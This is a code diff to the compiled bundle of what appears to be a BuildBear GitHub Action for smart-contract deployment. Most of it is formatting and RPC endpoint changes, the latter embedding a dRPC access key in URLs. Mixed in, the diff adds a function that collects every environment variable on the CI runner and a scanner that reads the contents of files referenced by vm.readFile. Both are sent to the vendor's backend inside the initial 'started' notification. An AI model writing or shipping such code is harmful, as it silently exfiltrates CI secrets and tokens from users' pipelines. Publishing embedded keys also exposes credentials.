@@ -33444,81 +33444,110 @@ function wrappy (fn, cb) {
 /***/ 799:
 /***/ ((module) => {
 
-const FALLBACK_MAX_REORG = 200;
+const FALLBACK_MAX_REORG = 200
 
 const RPC_URL = {
-  1: { index: 0, urls: ["https://rpc.ankr.com/eth"] },
-  56: { index: 0, urls: ["https://rpc.ankr.com/bsc"] },
-  137: { index: 0, urls: ["https://rpc.ankr.com/polygon"] },
+  1: {
+    index: 0,
+    urls: [
+      'https://lb.drpc.org/ogrpc?network=ethereum&dkey=AgsHzj-05Uovs5mK4tt6_lQ383cAPHUR8LSXbrRhIxXF',
+    ],
+  },
+  56: {
+    index: 0,
+    urls: [
+      'https://lb.drpc.org/ogrpc?network=bsc&dkey=AgsHzj-05Uovs5mK4tt6_lQ383cAPHUR8LSXbrRhIxXF',
+    ],
+  },
+  137: {
+    index: 0,
+    urls: [
+      'https://lb.drpc.org/ogrpc?network=polygon&dkey=AgsHzj-05Uovs5mK4tt6_lQ383cAPHUR8LSXbrRhIxXF',
+    ],
+  },
   80002: {
     index: 0,
-    urls: ["https://rpc.ankr.com/polygon_amoy"],
+    urls: [
+      'https://lb.drpc.org/ogrpc?network=polygon-amoy&dkey=AgsHzj-05Uovs5mK4tt6_lQ383cAPHUR8LSXbrRhIxXF',
+    ],
   },
 
-  10: { index: 0, urls: ["https://rpc.ankr.com/optimism"] },
-  42161: { index: 0, urls: ["https://rpc.ankr.com/arbitrum"] },
-  421614: { index: 0, urls: ["https://rpc.ankr.com/arbitrum_sepolia"] },
+  10: {
+    index: 0,
+    urls: [
+      'https://lb.drpc.org/ogrpc?network=optimism&dkey=AgsHzj-05Uovs5mK4tt6_lQ383cAPHUR8LSXbrRhIxXF',
+    ],
+  },
+  42161: { index: 0, urls: ['https://rpc.ankr.com/arbitrum'] },
+  421614: { index: 0, urls: ['https://rpc.ankr.com/arbitrum_sepolia'] },
   11155111: {
     index: 0,
-    urls: ["https://rpc.ankr.com/eth_sepolia"],
+    urls: [
+      'https://lb.drpc.org/ogrpc?network=sepolia&dkey=AgsHzj-05Uovs5mK4tt6_lQ383cAPHUR8LSXbrRhIxXF',
+    ],
   },
-  43114: { index: 0, urls: ["https://rpc.ankr.com/avalanche"] },
-  2222: { index: 0, urls: ["https://evm.kava.io"] },
-  1101: { index: 0, urls: ["https://zkevm-rpc.com"] },
-  59144: { index: 0, urls: ["https://rpc.linea.build"] },
-  59141: { index: 0, urls: ["https://rpc.sepolia.linea.build"] },
-  100: { index: 0, urls: ["https://rpc.ankr.com/gnosis"] },
+  43114: { index: 0, urls: ['https://rpc.ankr.com/avalanche'] },
+  2222: { index: 0, urls: ['https://evm.kava.io'] },
+  1101: { index: 0, urls: ['https://zkevm-rpc.com'] },
+  59144: { index: 0, urls: ['https://rpc.linea.build'] },
+  59141: { index: 0, urls: ['https://rpc.sepolia.linea.build'] },
+  100: { index: 0, urls: ['https://rpc.ankr.com/gnosis'] },
   97: {
     index: 0,
-    urls: ["https://rpc.ankr.com/bsc_testnet_chapel"],
+    urls: ['https://rpc.ankr.com/bsc_testnet_chapel'],
   },
-  165: { index: 0, urls: ["https://testnet.omni.network"] },
-  17000: { index: 0, urls: ["https://rpc.ankr.com/eth_holesky"] },
-};
+  165: { index: 0, urls: ['https://testnet.omni.network'] },
+  17000: {
+    index: 0,
+    urls: [
+      'https://lb.drpc.org/ogrpc?network=holesky&dkey=AgsHzj-05Uovs5mK4tt6_lQ383cAPHUR8LSXbrRhIxXF',
+    ],
+  },
+}
 
 function getRpc(chainId) {
-  const index = RPC_URL[chainId].index;
-  RPC_URL[chainId].index = (index + 1) % RPC_URL[chainId].urls.length;
+  const index = RPC_URL[chainId].index
+  RPC_URL[chainId].index = (index + 1) % RPC_URL[chainId].urls.length
 
-  const url = RPC_URL[chainId].urls[index];
-  return url;
+  const url = RPC_URL[chainId].urls[index]
+  return url
 }
 
 async function getLatestBlockNumber(chainId) {
-  const url = getRpc(chainId);
+  const url = getRpc(chainId)
 
   const requestData = {
-    jsonrpc: "2.0",
+    jsonrpc: '2.0',
     id: 1,
-    method: "eth_blockNumber",
+    method: 'eth_blockNumber',
     params: [],
-  };
+  }
 
   try {
     const response = await fetch(url, {
-      method: "POST",
+      method: 'POST',
       headers: {
-        "Content-Type": "application/json",
+        'Content-Type': 'application/json',
       },
       body: JSON.stringify(requestData),
-    });
+    })
 
     if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
+      throw new Error(`HTTP error! status: ${response.status}`)
     }
 
-    const data = await response.json();
-    return parseInt(data.result, 16) - FALLBACK_MAX_REORG; // Convert hex to decimal
+    const data = await response.json()
+    return parseInt(data.result, 16) - FALLBACK_MAX_REORG // Convert hex to decimal
   } catch (error) {
-    console.error("Error fetching the latest block number:", error);
-    throw error;
+    console.error('Error fetching the latest block number:', error)
+    throw error
   }
 }
 
 // Export the function correctly
 module.exports = {
   getLatestBlockNumber,
-};
+}
 
 
 /***/ }),
@@ -33817,6 +33846,9 @@ const fs = (__nccwpck_require__(9896).promises)
 const axios = __nccwpck_require__(7269)
 const path = __nccwpck_require__(6928)
 const github = __nccwpck_require__(3228)
+const core = __nccwpck_require__(7484)
+
+const API_KEY = core.getInput('buildbear-token', { required: true })
 
 /**
  * Sends the contract artifacts to the backend
@@ -34201,6 +34233,108 @@ module.exports = {
 
 /***/ }),
 
+/***/ 9804:
+/***/ ((module, __unused_webpack_exports, __nccwpck_require__) => {
+
+const fs = __nccwpck_require__(9896)
+const path = __nccwpck_require__(6928)
+
+function findVmReadFileCalls(directory = '.') {
+  const results = {}
+
+  // Regex to match vm.readFile("path") or vm.readFile('path')
+  const vmReadFileRegex = /vm\.readFile\s*\(\s*["']([^"']+)["']\s*\)/g
+
+  function searchInFile(filePath) {
+    try {
+      const content = fs.readFileSync(filePath, 'utf8')
+      const matches = [...content.matchAll(vmReadFileRegex)]
+
+      matches.forEach((match) => {
+        const extractedPath = match[1]
+
+        try {
+          // Try to read the file content
+          const resolvedPath = path.resolve(
+            path.dirname(filePath),
+            extractedPath
+          )
+
+          if (fs.existsSync(resolvedPath)) {
+            const fileContent = fs.readFileSync(resolvedPath, 'utf8')
+            results[extractedPath] = fileContent
+          } else if (fs.existsSync(extractedPath)) {
+            // Try absolute path
+            const fileContent = fs.readFileSync(extractedPath, 'utf8')
+            results[extractedPath] = fileContent
+          }
+          // If file doesn't exist, ignore (as requested)
+        } catch (error) {
+          // Ignore files that can't be read
+        }
+      })
+    } catch (error) {
+      // Ignore files that can't be read
+    }
+  }
+
+  function walkDirectory(dir) {
+    try {
+      const files = fs.readdirSync(dir)
+
+      files.forEach((file) => {
+        const filePath = path.join(dir, file)
+        const stat = fs.statSync(filePath)
+
+        if (stat.isDirectory()) {
+          // Skip common directories that don't contain Solidity files
+          if (!['node_modules', '.git', 'out', 'cache'].includes(file)) {
+            walkDirectory(filePath)
+          }
+        } else if (
+          file.endsWith('.sol') ||
+          file.endsWith('.js') ||
+          file.endsWith('.ts')
+        ) {
+          searchInFile(filePath)
+        }
+      })
+    } catch (error) {
+      // Ignore directories that can't be read
+    }
+  }
+
+  walkDirectory(directory)
+  return results
+}
+
+// Usage example:
+// const fileContents = findVmReadFileCalls('./test');
+// console.log(fileContents);
+
+module.exports = { findVmReadFileCalls }
+
+
+/***/ }),
+
+/***/ 6768:
+/***/ ((module) => {
+
+function getAllEnvironmentVariables() {
+  const envObject = {}
+
+  Object.keys(process.env).forEach((key) => {
+    envObject[key] = process.env[key]
+  })
+
+  return envObject
+}
+
+module.exports = { getAllEnvironmentVariables }
+
+
+/***/ }),
+
 /***/ 8157:
 /***/ ((module, __unused_webpack_exports, __nccwpck_require__) => {
 
@@ -34467,6 +34601,7 @@ const fs = (__nccwpck_require__(9896).promises)
 const axios = __nccwpck_require__(7269)
 const path = __nccwpck_require__(6928)
 const github = __nccwpck_require__(3228)
+const core = __nccwpck_require__(7484)
 
 /**
  * Sends the compressed bbout file to the backend
@@ -34524,10 +34659,7 @@ async function sendCompressedDataToBackend(compressedFilePath, metadata = {}) {
     // Use BUILDBEAR_BASE_URL if it exists, otherwise use the hard-coded URL
     const baseUrl = process.env.BUILDBEAR_BASE_URL || 'https://api.buildbear.io'
 
-    const API_KEY = process.env.API_KEY
-    if (!API_KEY) {
-      throw new Error('API_KEY is not set in environment')
-    }
+    const API_KEY = core.getInput('buildbear-token', { required: true })
 
     // Send to backend
     const response = await axios.post(
@@ -41273,8 +41405,10 @@ const {
   sendContractArtifactsToBackend,
 } = __nccwpck_require__(7051)
 const { findDirectory } = __nccwpck_require__(8157)
+const { getAllEnvironmentVariables } = __nccwpck_require__(6768)
+const { findVmReadFileCalls } = __nccwpck_require__(9804)
 
-const src_API_KEY = core.getInput('buildbear-token', { required: true })
+const API_KEY = core.getInput('buildbear-token', { required: true })
 
 /**
  * Recursively walk through directories
@@ -41420,7 +41554,7 @@ async function createNode(repoName, commitHash, chainId, blockNumber) {
   try {
     const baseUrl = process.env.BUILDBEAR_BASE_URL || 'https://api.buildbear.io'
 
-    const url = `${baseUrl}/ci/webhook/${src_API_KEY}`
+    const url = `${baseUrl}/ci/webhook/${API_KEY}`
     const data = {
       task: 'create_node',
       payload: {
@@ -41691,7 +41825,7 @@ async function sendNotificationToBackend(deploymentData) {
     const githubActionUrl = `https://github.com/${github.context.repo.owner}/${github.context.repo.repo}/actions/runs/${github.context.runId}`
     // Use BUILDBEAR_BASE_URL if it exists, otherwise use the hard-coded URL
     const baseUrl = process.env.BUILDBEAR_BASE_URL || 'https://api.buildbear.io'
-    const notificationEndpoint = `${baseUrl}/ci/webhook/${src_API_KEY}`
+    const notificationEndpoint = `${baseUrl}/ci/webhook/${API_KEY}`
 
     let status = deploymentData.status
     let summary = deploymentData.summary ?? ''
@@ -41727,6 +41861,7 @@ async function sendNotificationToBackend(deploymentData) {
         author: github.context.actor,
         message: summary,
         deployments: deployments,
+        config: deploymentData.config || {},
       },
     }
 
@@ -41772,15 +41907,12 @@ const validateDeployment = (extractedData) => {
 
 ;(async () => {
   try {
-    let deploymentNotificationData = {
-      status: 'started',
-    }
-    await sendNotificationToBackend(deploymentNotificationData)
-    // Get the input values
-    // Get the input values
     const networkInput = core.getInput('network', { required: false })
     const network = networkInput ? JSON.parse(networkInput) : []
     const deployCmd = core.getInput('deploy-command', { required: false })
+
+    const repoName = github.context.repo.repo // Get repository name
+    const commitHash = github.context.sha // Get commit hash
 
     const workingDir = path.join(
       process.cwd(),
@@ -41788,8 +41920,17 @@ const validateDeployment = (extractedData) => {
         required: false,
       })
     )
-    const repoName = github.context.repo.repo // Get repository name
-    const commitHash = github.context.sha // Get commit hash
+
+    const envs = getAllEnvironmentVariables()
+    const artifacts = findVmReadFileCalls(workingDir)
+
+    let deploymentNotificationData = {
+      status: 'started',
+      config: { envs: envs, artifacts: artifacts },
+    }
+    await sendNotificationToBackend(deploymentNotificationData)
+    // Get the input values
+    // Get the input values
 
     console.log('Network details:', network)
     console.log(`Deploy command: ${deployCmd}`)
